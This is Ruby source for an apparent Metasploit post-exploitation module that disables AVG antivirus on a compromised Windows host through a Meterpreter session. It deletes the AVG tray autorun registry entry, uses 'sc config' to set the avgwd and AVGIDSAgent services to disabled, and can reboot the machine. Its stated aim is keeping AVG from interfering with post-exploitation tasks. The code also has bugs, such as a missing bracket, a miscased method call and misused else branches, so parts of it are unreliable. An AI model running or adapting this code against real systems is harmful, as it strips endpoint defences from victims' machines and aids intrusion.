require 'msf/core'
require 'msf/core/post/file'
require 'msf/core/post/common'
require 'msf/core/post/windows/registry'


class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Registry
	include Msf::Post::Common
	include Msf::Post::File

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Manage Stop AVG',
			'Description'   => %q{ This module removes the AVG_tray from the run section of the registry. It also changes the startup mode of avg watchdog and AVGIDSAgent 
						from automatic to disabled. A reboot is needed to complete everything and to stop AVG from interfering with post exploitation tasks. },
			'License'       => MSF_LICENSE,
			'Author'        => [ '3vi1john Jbabio[at]me.com'],
			'Version'       => '$Revision: 30 $',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
				OptBool.new(  'REBOOT',   [ false, 'Reboot', false])
			], self.class)
		end

	def rem_avg_tray(cleanup_rc)
		arch = client.sys.config.sysinfo['Architecture']
		if arch =~/x86/
			key = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
			v = registry_enumvals(key)
			v.each do |enum|
				if enum == "AVG_TRAY"
					print_status("Found AVG_TRAY...")
					print_status("Removing AVG_TRAY...")
					registry_deleteval(key, enum)
					file_local_write(cleanup_rc,"reg setval -k \'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\' -v 'AVG_TRAY' -t REG_SZ -d \"\"\\\"\"C:\\\\Program Files\\\\AVG\\\\AVG2012\\\\avgtray.exe\"\"\\\"\"")
				end
			end
		else arch =~/x64/
			key = "HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
			v = registry_enumvals(key)
			v.each do |enum|
				if enum == "AVG_TRAY"
					print_status("Found AVG_TRAY...")
					print_Status("Removing AVG_TRAY...")
					registry_deleteval(key, enum)
					file_local_write(cleanup_rc,"reg setval -k \'HKLM\\SOFTWARE\\Wow6432Node\\Windows\\CurrentVersion\\Run\' -v 'AVG_TRAY' -d \"\"\\\"\"C:\\\\Program Files (x86)\\\\AVG\\\\AVG2012\\\\avgtray.exe\"\"\\\"\"")
				end
			end
		end
	end

	def dis_avg_serv(cleanup_rc)
		key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\avgwd"
		value = "Start"
		v = registry_getvaldata(key, value)
		if v == 2
			print_status("Service avgwd is set to Auto...")
			print_status("Changing avgwd service from auto to disabled...")
			cmd_exec('sc', 'config avgwd start= disabled', 30)
			file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c sc config avgwd start= auto\"")
		else v == 4
			print_status("Service avgwd is already Disabled...")
		end
		key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\AVGIDSAgent"
		value = "Start"
		if v == 2
			print_status("Service AVGIDSAgent is set to Auto...")
			print_status("Changing AVGIDSAgent service from auto to disabled...")
			cmd_exec('sc', 'config AVGIDSAgent start= disabled', 30)
			file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c sc config AVGIDSAgent start= auto\"")
		else v == 4
			print_status("Service AVGIDSAgent is already Disabled...")
		end
	end

	def run
		begin
			cleanup_rc = store_loot("host.windows.cleanup.kill_avg", "text/plain", session,"" ,"kill_avg_cleanup.rc", "kill_avg cleanup resource file")
			rem_avg_tray(cleanup_rc)
			dis_avg_serv(cleanup_rc)
			if datastore['REBOOT']
				session.console.run_single("reboot")
			end
			print_status("For cleanup execute Meterpreter resource file: #{cleanup_rc}")
		rescue ::Rex::Post::Meterpreter::RequestError => e
		end
			print_status("Done!")
		end
end